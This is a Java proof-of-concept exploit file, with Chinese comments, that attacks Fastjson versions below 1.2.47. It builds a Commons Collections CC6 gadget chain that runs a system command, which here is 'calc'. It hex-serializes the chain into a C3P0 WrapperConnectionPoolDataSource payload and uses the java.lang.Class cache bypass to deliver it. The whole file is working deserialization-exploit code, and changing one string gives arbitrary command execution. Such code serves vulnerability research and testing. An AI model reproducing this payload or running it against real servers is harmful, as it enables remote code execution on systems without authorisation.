package com.yyjccc.fastjson.exp;

import com.alibaba.fastjson.JSON;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.beans.PropertyVetoException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.StringWriter;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class C3P0_Hex {

	//CC6的利用链
	public static Map CC6() throws NoSuchFieldException, IllegalAccessException {
		//使用InvokeTransformer包装一下
		Transformer[] transformers=new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
				new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
				new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
		};

		ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

		HashMap<Object,Object> hashMap1=new HashMap<>();
		LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,new ConstantTransformer(1));

		TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"abc");
		HashMap<Object,Object> hashMap2=new HashMap<>();
		hashMap2.put(tiedMapEntry,"eee");
		lazyMap.remove("abc");


		//反射修改LazyMap类的factory属性
		Class clazz=LazyMap.class;
		Field factoryField= clazz.getDeclaredField("factory");
		factoryField.setAccessible(true);
		factoryField.set(lazyMap,chainedTransformer);

		return hashMap2;
	}


	static void addHexAscii(byte b, StringWriter sw)
	{
		int ub = b & 0xff;
		int h1 = ub / 16;
		int h2 = ub % 16;
		sw.write(toHexDigit(h1));
		sw.write(toHexDigit(h2));
	}

	private static char toHexDigit(int h)
	{
		char out;
		if (h <= 9) out = (char) (h + 0x30);
		else out = (char) (h + 0x37);
		//System.err.println(h + ": " + out);
		return out;
	}

	//将类序列化为字节数组
	public static byte[] tobyteArray(Object o) throws IOException {
		ByteArrayOutputStream bao = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(bao);
		oos.writeObject(o);
		return bao.toByteArray();
	}

	//字节数组转十六进制
	public static String toHexAscii(byte[] bytes)
	{
		int len = bytes.length;
		StringWriter sw = new StringWriter(len * 2);
		for (int i = 0; i < len; ++i)
			addHexAscii(bytes[i], sw);
		return sw.toString();
	}

	public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException {
		String hex = toHexAscii(tobyteArray(CC6()));
		//System.out.println(hex);

		//Fastjson<1.2.47
		String payload = "{" +
				"\"1\":{" +
				"\"@type\":\"java.lang.Class\"," +
				"\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"" +
				"}," +
				"\"2\":{" +
				"\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
				"\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ hex + ";\"," +
				"}" +
				"}";
		System.out.println(payload);
		JSON.parse(payload);


	}
}
